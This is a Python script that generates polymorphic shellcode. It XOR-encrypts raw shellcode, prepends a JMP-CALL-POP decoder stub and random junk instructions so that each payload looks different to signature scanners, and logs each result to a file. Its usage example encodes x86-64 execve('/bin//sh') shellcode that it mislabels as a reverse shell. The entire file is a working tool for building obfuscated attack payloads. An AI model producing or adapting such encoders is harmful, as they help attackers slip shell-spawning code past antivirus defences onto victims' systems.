#!/usr/bin/python3
import datetime
import random

def generate_payload(hex_input, description):
    # 1. Data preparation
    try:
        shellcode = bytearray.fromhex(hex_input)
    except ValueError:
        return "Error: Invalid HEX format."

    # 2. Generate random key (avoid 0x00)
    key = random.randint(1, 255)
    key_hex = hex(key)[2:].zfill(2)

    # 3. XOR encryption
    encoded = bytearray()
    for byte in shellcode:
        encoded.append(byte ^ key)

    # 4. Dynamic Stub-decoder (JMP-CALL-POP)
    # \x80\x37\xXX -- here XX is our key
    hex_len = hex(len(shellcode))[2:].zfill(2)
    decoder_stub = f"eb0e5f6a{hex_len}598037{key_hex}48ffc7e2f8eb05e8edffffff"
    
    # 5. Polymorphic Junk Code (NOP-Sled / Trash instrs)
    # Makes the shellcode start unique on each run
    junk_ops = [
        "90",       # NOP
        "48ffc0",   # INC RAX
        "48ffc8",   # DEC RAX
        "48ffc3",   # INC RBX
        "48ffcb",   # DEC RBX
        "fc",       # CLD
        "f8",       # CLC
        "f9",       # STC
    ]
    # Generate 1 to 5 random instructions before the decoder
    junk_chunk = "".join(random.choice(junk_ops) for _ in range(random.randint(1, 5)))

    final_payload = junk_chunk + decoder_stub + encoded.hex()
    
    # 6. Logging
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = (
        f"--- {timestamp} ---\n"
        f"Description: {description} [Polymorphic]\n"
        f"Encryption Type: XOR (Key: 0x{key_hex.upper()})\n"
        f"Junk Prefix: {junk_chunk}\n"
        f"Original: {hex_input}\n"
        f"Payload:  {final_payload}\n"
        f"Size: {len(final_payload)//2} bytes\n"
        f"{'-'*40}\n"
    )

    with open("XOR.txt", "a", encoding="utf-8") as f:
        f.write(log_entry)

    return final_payload, key_hex, timestamp

# --- USAGE ---
# Insert your HEX and write what it does
my_hex = "4831f65648bb2f62696e2f2f736853545f5657545e6a3b58990f05"
my_desc = "/bin//sh reverse shell"

payload, key, time = generate_payload(my_hex, my_desc)

print(f"[*] Generated new Payload (Key: 0x{key})")
print(f"[*] Result written to XOR.txt")
print(f"[*] Payload:\n{payload}")
